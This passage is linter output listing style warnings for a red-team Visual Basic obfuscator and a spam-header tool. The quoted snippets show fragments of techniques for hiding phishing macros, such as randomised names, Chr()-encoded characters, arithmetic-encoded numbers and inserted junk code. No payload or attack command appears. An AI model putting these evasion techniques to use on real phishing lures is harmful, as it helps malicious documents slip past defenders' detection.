718 |             dbg("Full long line joined altogether:\n{{ %s }}\n" % longLine)
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:718:17
    |
716 |                     newLine += '%s = %s + "%s"\n' % (varName, varName, longLine[fr:to])
717 |
718 |             dbg("Full long line joined altogether:\n{{ %s }}\n" % longLine)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
719 |             if len(longLine) < SPLIT:
720 |                 dbg("Too short to be replaced (%s)..." % longLine)
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:720:21
    |
718 |             dbg("Full long line joined altogether:\n{{ %s }}\n" % longLine)
719 |             if len(longLine) < SPLIT:
720 |                 dbg("Too short to be replaced (%s)..." % longLine)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
721 |                 continue
722 |             else:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:724:21
    |
722 |               else:
723 |                   dbg(
724 | /                     "This line will get merged:\n{{ %s }}\nINTO:\n{{ %s }}\n"
725 | |                     % (origLine, newLine)
    | |_________________________________________^
726 |                   )
727 |                   replaces.append((origLine, newLine, longLine))
    |
help: Replace with format specifiers

N806 Variable `longLine` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:731:24
    |
729 |                     break
730 |
731 |         for orig, new, longLine in replaces:
    |                        ^^^^^^^^
732 |             if DEBUG:
733 |                 dbg(
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:734:21
    |
732 |               if DEBUG:
733 |                   dbg(
734 | /                     "Merging long line:\n\t{{ %s }}\n\t======>\n\t{{ %s }}\n\n"
735 | |                     % (orig, new)
    | |_________________________________^
736 |                   )
737 |               else:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:739:21
    |
737 |             else:
738 |                 info(
739 |                     "Merging long string line (var: %s, len: %d): '%s...%s'"
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
740 |                     % (varName, len(longLine), longLine[:40], longLine[-40:])
741 |                 )
    |
help: Replace with format specifiers

N806 Variable `replacedAlready` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:747:9
    |
746 |     def randomizeVariablesAndFunctions(self):
747 |         replacedAlready = {}
    |         ^^^^^^^^^^^^^^^
748 |
749 |         def replaceVar(name, m):
    |

N806 Variable `varName` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:750:13
    |
749 |         def replaceVar(name, m):
750 |             varName = randomString(random.randint(4, 12))
    |             ^^^^^^^
751 |             varToReplace = ""
    |

N806 Variable `varToReplace` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:751:13
    |
749 |         def replaceVar(name, m):
750 |             varName = randomString(random.randint(4, 12))
751 |             varToReplace = ""
    |             ^^^^^^^^^^^^
752 |
753 |             if m and len(m.groups()) > 0:
    |

N806 Variable `varToReplace` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:756:25
    |
754 |                 for a in m.groups():
755 |                     if a and len(a) > 0:
756 |                         varToReplace = a
    |                         ^^^^^^^^^^^^
757 |                         break
    |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:759:20
    |
757 |                         break
758 |
759 |                 if varToReplace in replacedAlready.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
760 |                     return
761 |                 if len(varToReplace) < self.min_var_length:
    |
help: Remove `.keys()`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:768:23
    |
766 |                   info(
767 |                       name
768 |                       + " name obfuscated (context: \"%s\"): '%s' => '%s'"
    |  _______________________^
769 | |                     % (m.group(0).strip(), varToReplace, varName)
    | |_________________________________________________________________^
770 |                   )
771 |                   replacedAlready[varToReplace] = varName
    |
help: Replace with format specifiers

F841 Local variable `pos` is assigned to but never used
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:799:13
    |
797 |             ScriptObfuscator.FUNCTION_REGEX, self.output, flags=re.I | re.M
798 |         ):
799 |             pos = m.span()[0]
    |             ^^^
800 |             funcName = m.group(1)
    |
help: Remove assignment to unused variable `pos`

N806 Variable `funcName` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:800:13
    |
798 |         ):
799 |             pos = m.span()[0]
800 |             funcName = m.group(1)
    |             ^^^^^^^^
801 |
802 |             for n in re.finditer(
    |

F841 Local variable `pos2` is assigned to but never used
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:807:17
    |
805 |                 flags=re.I | re.M,
806 |             ):
807 |                 pos2 = n.span()[0]
    |                 ^^^^
808 |                 varName = randomString(random.randint(4, 12))
809 |                 varToReplace = n.group(1)
    |
help: Remove assignment to unused variable `pos2`

N806 Variable `varName` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:808:17
    |
806 |             ):
807 |                 pos2 = n.span()[0]
808 |                 varName = randomString(random.randint(4, 12))
    |                 ^^^^^^^
809 |                 varToReplace = n.group(1)
    |

N806 Variable `varToReplace` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:809:17
    |
807 |                 pos2 = n.span()[0]
808 |                 varName = randomString(random.randint(4, 12))
809 |                 varToReplace = n.group(1)
    |                 ^^^^^^^^^^^^
810 |
811 |                 if varToReplace in replacedAlready.keys():
    |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:811:20
    |
809 |                 varToReplace = n.group(1)
810 |
811 |                 if varToReplace in replacedAlready.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
812 |                     continue
813 |                 replacedAlready[varToReplace] = varName
    |
help: Remove `.keys()`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:815:21
    |
813 |                   replacedAlready[varToReplace] = varName
814 |                   info(
815 | /                     "Function: (%s): Adding variable obfuscation: (%s) => (%s)"
816 | |                     % (funcName, varToReplace, varName)
    | |_______________________________________________________^
817 |                   )
    |
help: Replace with format specifiers

N806 Variable `varName` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:823:13
    |
821 |             ScriptObfuscator.FUNCTION_REGEX, self.output, flags=re.I | re.M
822 |         ):
823 |             varName = randomString(random.randint(4, 12))
    |             ^^^^^^^
824 |             varToReplace = m.group(1)
    |

N806 Variable `varToReplace` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:824:13
    |
822 |         ):
823 |             varName = randomString(random.randint(4, 12))
824 |             varToReplace = m.group(1)
    |             ^^^^^^^^^^^^
825 |
826 |             if len(varToReplace) < self.min_var_length:
    |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:832:16
    |
830 |             if varToReplace in ScriptObfuscator.RESERVED_NAMES:
831 |                 continue
832 |             if varToReplace in replacedAlready.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
833 |                 continue
    |
help: Remove `.keys()`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:836:17
    |
835 |               info(
836 | /                 "Function name obfuscated (context: \"%s\"): '%s' => '%s'"
837 | |                 % (m.group(0).strip(), varToReplace, varName)
    | |_____________________________________________________________^
838 |               )
839 |               # self.output = re.sub(r"\b" + varToReplace + r"\b", varName, self.output, flags=re.I | re.M)
    |
help: Replace with format specifiers

N806 Variable `varToReplace` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:842:13
    |
840 |             replacedAlready[varToReplace] = varName
841 |
842 |         for varToReplace, varName in replacedAlready.items():
    |             ^^^^^^^^^^^^
843 |             dbg("Obfuscate variable name: (%s) => (%s)" % (varToReplace, varName))
844 |             self.output = re.sub(
    |

N806 Variable `varName` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:842:27
    |
840 |             replacedAlready[varToReplace] = varName
841 |
842 |         for varToReplace, varName in replacedAlready.items():
    |                           ^^^^^^^
843 |             dbg("Obfuscate variable name: (%s) => (%s)" % (varToReplace, varName))
844 |             self.output = re.sub(
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:843:17
    |
842 |         for varToReplace, varName in replacedAlready.items():
843 |             dbg("Obfuscate variable name: (%s) => (%s)" % (varToReplace, varName))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
844 |             self.output = re.sub(
845 |                 r"(?<!\.)(?:\b"
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:855:14
    |
853 |             )
854 |
855 |         info("Randomized %d names in total." % len(replacedAlready))
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
856 |
857 |     @staticmethod
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:861:31
    |
859 |         rnd1 = random.randint(0, 3333)
860 |         num_coders = (
861 |             lambda rnd1, num: "%d" % num,
    |                               ^^^^
862 |             lambda rnd1, num: "%d-%d" % (rnd1 + num, rnd1),
863 |             lambda rnd1, num: "%d-%d" % (2 * rnd1 + num, 2 * rnd1),
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:862:31
    |
860 |         num_coders = (
861 |             lambda rnd1, num: "%d" % num,
862 |             lambda rnd1, num: "%d-%d" % (rnd1 + num, rnd1),
    |                               ^^^^^^^
863 |             lambda rnd1, num: "%d-%d" % (2 * rnd1 + num, 2 * rnd1),
864 |             lambda rnd1, num: "%d-%d" % (3 * rnd1 + num, 3 * rnd1),
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:863:31
    |
861 |             lambda rnd1, num: "%d" % num,
862 |             lambda rnd1, num: "%d-%d" % (rnd1 + num, rnd1),
863 |             lambda rnd1, num: "%d-%d" % (2 * rnd1 + num, 2 * rnd1),
    |                               ^^^^^^^
864 |             lambda rnd1, num: "%d-%d" % (3 * rnd1 + num, 3 * rnd1),
865 |             lambda rnd1, num: "%d+%d" % (-rnd1, rnd1 + num),
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:864:31
    |
862 |             lambda rnd1, num: "%d-%d" % (rnd1 + num, rnd1),
863 |             lambda rnd1, num: "%d-%d" % (2 * rnd1 + num, 2 * rnd1),
864 |             lambda rnd1, num: "%d-%d" % (3 * rnd1 + num, 3 * rnd1),
    |                               ^^^^^^^
865 |             lambda rnd1, num: "%d+%d" % (-rnd1, rnd1 + num),
866 |             lambda rnd1, num: "%d/%d" % (rnd1 * num, rnd1),
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:865:31
    |
863 |             lambda rnd1, num: "%d-%d" % (2 * rnd1 + num, 2 * rnd1),
864 |             lambda rnd1, num: "%d-%d" % (3 * rnd1 + num, 3 * rnd1),
865 |             lambda rnd1, num: "%d+%d" % (-rnd1, rnd1 + num),
    |                               ^^^^^^^
866 |             lambda rnd1, num: "%d/%d" % (rnd1 * num, rnd1),
867 |         )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:866:31
    |
864 |             lambda rnd1, num: "%d-%d" % (3 * rnd1 + num, 3 * rnd1),
865 |             lambda rnd1, num: "%d+%d" % (-rnd1, rnd1 + num),
866 |             lambda rnd1, num: "%d/%d" % (rnd1 * num, rnd1),
    |                               ^^^^^^^
867 |         )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:872:19
    |
870 |         if "/0" in out:
871 |             # Ooops, it cannot be happen!
872 |             out = "%d" % num
    |                   ^^^^
873 |         return out
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:878:23
    |
876 |     def obfuscateChar(char):
877 |         char_coders = (
878 |             lambda x: '"{}"'.format(x),  # 0
    |                       ^^^^^^^^^^^^^^^^
879 |             lambda x: "Chr(&H%x)" % ord(x),  # 1
880 |             lambda x: "Chr(%d)" % ord(x),  # 2
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:879:23
    |
877 |         char_coders = (
878 |             lambda x: '"{}"'.format(x),  # 0
879 |             lambda x: "Chr(&H%x)" % ord(x),  # 1
    |                       ^^^^^^^^^^^^^^^^^^^^
880 |             lambda x: "Chr(%d)" % ord(x),  # 2
881 |             lambda x: "Chr(%s)" % ScriptObfuscator.obfuscateNumber(ord(x)),  # 3
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:880:23
    |
878 |             lambda x: '"{}"'.format(x),  # 0
879 |             lambda x: "Chr(&H%x)" % ord(x),  # 1
880 |             lambda x: "Chr(%d)" % ord(x),  # 2
    |                       ^^^^^^^^^
881 |             lambda x: "Chr(%s)" % ScriptObfuscator.obfuscateNumber(ord(x)),  # 3
882 |             lambda x: 'Chr(Int("&H%x"))' % ord(x),  # 4
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:881:23
    |
879 |             lambda x: "Chr(&H%x)" % ord(x),  # 1
880 |             lambda x: "Chr(%d)" % ord(x),  # 2
881 |             lambda x: "Chr(%s)" % ScriptObfuscator.obfuscateNumber(ord(x)),  # 3
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
882 |             lambda x: 'Chr(Int("&H%x"))' % ord(x),  # 4
883 |             lambda x: 'Chr(Int("%d"))' % ord(x),  # 5
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:882:23
    |
880 |             lambda x: "Chr(%d)" % ord(x),  # 2
881 |             lambda x: "Chr(%s)" % ScriptObfuscator.obfuscateNumber(ord(x)),  # 3
882 |             lambda x: 'Chr(Int("&H%x"))' % ord(x),  # 4
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
883 |             lambda x: 'Chr(Int("%d"))' % ord(x),  # 5
884 |         )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:883:23
    |
881 |             lambda x: "Chr(%s)" % ScriptObfuscator.obfuscateNumber(ord(x)),  # 3
882 |             lambda x: 'Chr(Int("&H%x"))' % ord(x),  # 4
883 |             lambda x: 'Chr(Int("%d"))' % ord(x),  # 5
    |                       ^^^^^^^^^^^^^^^^
884 |         )
885 |         return random.choice(char_coders)(char)
    |
help: Replace with format specifiers

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:905:13
    |
903 |                   new_string = new_string[: -len(delim)] + " _\n& "
904 |
905 | /             if i + 1 < len(string):
906 | |                 if char == '"' and string[i + 1] == '"':
    | |________________________________________________________^
907 |                       i += 2
908 |                       new_string += '""""' + delim
    |
help: Combine `if` statements using `and`

N803 Argument name `useBitShuffler` should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:924:32
    |
922 |         return new_string
923 |
924 |     def obfuscateStrings(self, useBitShuffler=True):
    |                                ^^^^^^^^^^^^^^^^^^^
925 |         replaces = set()
926 |         linesSurrounded = set()
    |

N806 Variable `linesSurrounded` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:926:9
    |
924 |     def obfuscateStrings(self, useBitShuffler=True):
925 |         replaces = set()
926 |         linesSurrounded = set()
    |         ^^^^^^^^^^^^^^^
927 |
928 |         for m in re.finditer(
    |

N806 Variable `exceptionallyAvoidBitShuffler` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:971:13
    |
969 |                 continue
970 |
971 |             exceptionallyAvoidBitShuffler = False
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
972 |
973 |             if "const " in line.lower():
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:979:21
    |
977 |               if BitShuffleStringObfuscator.STRING_PADDING_CHAR in string:
978 |                   info(
979 | /                     "\tPadding character: (%s) has been detected in input string. Have to avoid Bit Shuffle string encoder."
980 | |                     % BitShuffleStringObfuscator.STRING_PADDING_CHAR
    | |____________________________________________________________________^
981 |                   )
982 |                   exceptionallyAvoidBitShuffler = True
    |
help: Replace with format specifiers

N806 Variable `exceptionallyAvoidBitShuffler` in function should be lowercase
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:982:17
    |
980 |                     % BitShuffleStringObfuscator.STRING_PADDING_CHAR
981 |                 )
982 |                 exceptionallyAvoidBitShuffler = True
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
983 |
984 |             # info("String to obfuscate (context: {{%s}}, len: %d): {{%s}}" % (m.group(0).strip(), len(orig_string), string))
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:989:30
    |
987 |                   new_string = self.obfuscateStringBySubstitute(string)
988 |               else:
989 |                   new_string = '"%s"' % self.bitShuffleObfuscator.obfuscateString(
    |  ______________________________^
990 | |                     string, False
991 | |                 )
    | |_________________^
992 |                   if len(new_string) <= 40:
993 |                       new_string = self.obfuscateStringBySubstitute(new_string[1:-1])
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:994:30
    |
992 |                   if len(new_string) <= 40:
993 |                       new_string = self.obfuscateStringBySubstitute(new_string[1:-1])
994 |                   new_string = "%s(%s)" % (
    |  ______________________________^
995 | |                     self.bitShuffleObfuscator.getDeobfuscatorFuncName(),
996 | |                     new_string,
997 | |                 )
    | |_________________^
998 |
999 |               # info("OBFUSCATED:\n\t%s\n\t{{ %s }}\n\t=====>\n\t{{ %s }}\n\t%s\n" % ('^' * 60, string, new_string, '^' * 60))
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1015:21
     |
1013 |                   replaces.add((func, newfunc))
1014 |                   info(
1015 | /                     "OBFUSCATED DECLARE FUNC:\n\t%s\n\t{{ %s }}\n\t=====>\n\t{{ %s }}\n\t%s\n"
1016 | |                     % ("^" * 60, func, newfunc, "^" * 60)
     | |_________________________________________________________^
1017 |                   )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1020:17
     |
1019 |         for orig, new in replaces:
1020 |             dbg("Replacing:\n\t{{ %s }}\n\t=====>\n\t{{ %s }}\n" % (orig, new))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1021 |             self.output = self.output.replace(orig, new)
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1032:18
     |
1030 |             array = orig_array
1031 |             array = array.replace("\n", "").replace("\t", "")
1032 |             info("Array to obfuscate: Array(%s, ..., %s)" % (array[:40], array[-40:]))
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1033 |             for_nums_allowed = [x for x in string.digits[:]]
1034 |             for_nums_allowed.extend(
     |
help: Replace with format specifiers

C416 Unnecessary list comprehension (rewrite using `list()`)
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1033:32
     |
1031 |             array = array.replace("\n", "").replace("\t", "")
1032 |             info("Array to obfuscate: Array(%s, ..., %s)" % (array[:40], array[-40:]))
1033 |             for_nums_allowed = [x for x in string.digits[:]]
     |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1034 |             for_nums_allowed.extend(
1035 |                 ["a", "b", "c", "d", "e", "f", " ", "-", "_", "&", ","]
     |
help: Rewrite using `list()`

C417 Unnecessary `map()` usage (rewrite using a generator expression)
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1037:20
     |
1035 |                 ["a", "b", "c", "d", "e", "f", " ", "-", "_", "&", ","]
1036 |             )
1037 |             if all(map(lambda x: x in for_nums_allowed, array)):
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1038 |                 # Array of numbers
1039 |                 array = array.replace(" ", "").replace("_", "")
     |
help: Replace `map()` with a generator expression

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1050:25
     |
1048 |                       obfuscated = "Array(" + ",".join(new_array) + ")"
1049 |                       info(
1050 | /                         "\tObfuscated array: Array(%s, ..., %s)"
1051 | |                         % (",".join(new_array)[:40], ",".join(new_array)[-40:])
     | |_______________________________________________________________________________^
1052 |                       )
1053 |                       self.output = re.sub(
     |
help: Replace with format specifiers

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1060:38
     |
1058 |                     )
1059 |
1060 |                 except ValueError as e:
     |                                      ^
1061 |                     info(
1062 |                         "\tNOPE. This is not an array of numbers. Culprit: ('%s', context: '%s')"
     |
help: Remove assignment to unused variable `e`

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1062:25
     |
1060 |                   except ValueError as e:
1061 |                       info(
1062 | /                         "\tNOPE. This is not an array of numbers. Culprit: ('%s', context: '%s')"
1063 | |                         % (num, m.group(0))
     | |___________________________________________^
1064 |                       )
1065 |                       continue
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1086:13
     |
1085 |         info(
1086 |             "Appending %d garbage lines to the %d lines of input code %s"
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1087 |             % (garbages_num, len(lines), str(garbage_lines))
1088 |         )
     |
help: Replace with format specifiers

N806 Variable `varName` in function should be lowercase
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1113:17
     |
1111 |                     comment = False
1112 |
1113 |                 varName = randomString(random.randint(4, 12))
     |                 ^^^^^^^
1114 |                 varContents = self.obfuscateString(randomString(random.randint(10, 30)))
1115 |                 garbage = ""
     |

N806 Variable `varContents` in function should be lowercase
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1114:17
     |
1113 |                 varName = randomString(random.randint(4, 12))
1114 |                 varContents = self.obfuscateString(randomString(random.randint(10, 30)))
     |                 ^^^^^^^^^^^
1115 |                 garbage = ""
1116 |                 if comment:
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1118:25
     |
1116 |                   if comment:
1117 |                       garbage = (
1118 | /                         "'Dim %(varName)s As String\n'%(varName)s = %(varContents)s"
1119 | |                         % {"varName": varName, "varContents": varContents}
     | |__________________________________________________________________________^
1120 |                       )
1121 |                   else:
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1123:25
     |
1121 |                   else:
1122 |                       garbage = (
1123 | /                         "Dim %(varName)s As String\n%(varName)s = %(varContents)s"
1124 | |                         % {"varName": varName, "varContents": varContents}
     | |__________________________________________________________________________^
1125 |                       )
     |
help: Replace with format specifiers

N806 Variable `htmlOrHtaFile` in function should be lowercase
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1140:5
     |
1138 | def classifyFileAndExtractContents(contents):
1139 |     # Simple decision tree
1140 |     htmlOrHtaFile = ("<html", "</html>", "<script", "</script>")
     |     ^^^^^^^^^^^^^
1141 |
1142 |     allMarkers = True
     |

N806 Variable `allMarkers` in function should be lowercase
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1142:5
     |
1140 |     htmlOrHtaFile = ("<html", "</html>", "<script", "</script>")
1141 |
1142 |     allMarkers = True
     |     ^^^^^^^^^^
1143 |     for a in htmlOrHtaFile:
1144 |         if a not in contents.lower():
     |

N806 Variable `allMarkers` in function should be lowercase
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1145:13
     |
1143 |     for a in htmlOrHtaFile:
1144 |         if a not in contents.lower():
1145 |             allMarkers = False
     |             ^^^^^^^^^^
1146 |             break
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1309:9
     |
1308 |       out(
1309 | /         """
1310 | |     :: Visual Basic script obfuscator for thy red teaming needs!
1311 | |     Mariusz Banach / mgeeky, '17, '20; <mb [at] binary-offensive.com>
1312 | |     v: %(versionNum)s
1313 | | """
1314 | |         % {"versionNum": VERSION}
     | |_________________________________^
1315 |       )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1317:8
     |
1315 |     )
1316 |
1317 |     ok("Input file:\t\t%s" % config["file"])
     |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1318 |     if config["output"]:
1319 |         ok("Output file:\t%s" % config["output"])
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1319:12
     |
1317 |     ok("Input file:\t\t%s" % config["file"])
1318 |     if config["output"]:
1319 |         ok("Output file:\t%s" % config["output"])
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1320 |     else:
1321 |         ok("Output file:\tstdout.")
     |
help: Replace with format specifiers

UP015 [*] Unnecessary mode argument
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1324:31
     |
1323 |     contents = ""
1324 |     with open(config["file"], "r") as f:
     |                               ^^^
1325 |         contents = f.read()
     |
help: Remove mode argument

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1329:8
     |
1327 |     contents = classifyFileAndExtractContents(contents)
1328 |
1329 |     ok("Input file length: %d" % len(contents))
     |        ^^^^^^^^^^^^^^^^^^^^^^^
1330 |
1331 |     obfuscator = ScriptObfuscator(
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1340:12
     |
1339 |     if obfuscated:
1340 |         ok("Obfuscated file length: %d" % len(obfuscated))
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1341 |         if not config["output"]:
1342 |             out("\n\n")
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\phishing\VisualBasicObfuscator\obfuscate.py:1352:16
     |
1350 |             with open(config["output"], "w") as f:
1351 |                 f.write(obfuscated)
1352 |             ok("Obfuscated code has been written to:\n\t\t%s\n" % config["output"])
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1353 |     else:
1354 |         return False
     |
help: Replace with format specifiers

F401 [*] `argparse` imported but unused
 --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:3:8
  |
1 | #!/usr/bin/python3
2 |
3 | import argparse
  |        ^^^^^^^^
4 | import base64
5 | import glob
  |
help: Remove unused import: `argparse`

F401 [*] `base64` imported but unused
 --> security\penetration-testing-tools\phishing\decode-spam-headers\correlate-rules.py:4:8
  |
3 | import argparse
4 | import base64
  |        ^^^^^^
5 | import glob
6 | import json
  |
help: Remove unused import: `base64`

F401 [*] `json` imported but unused
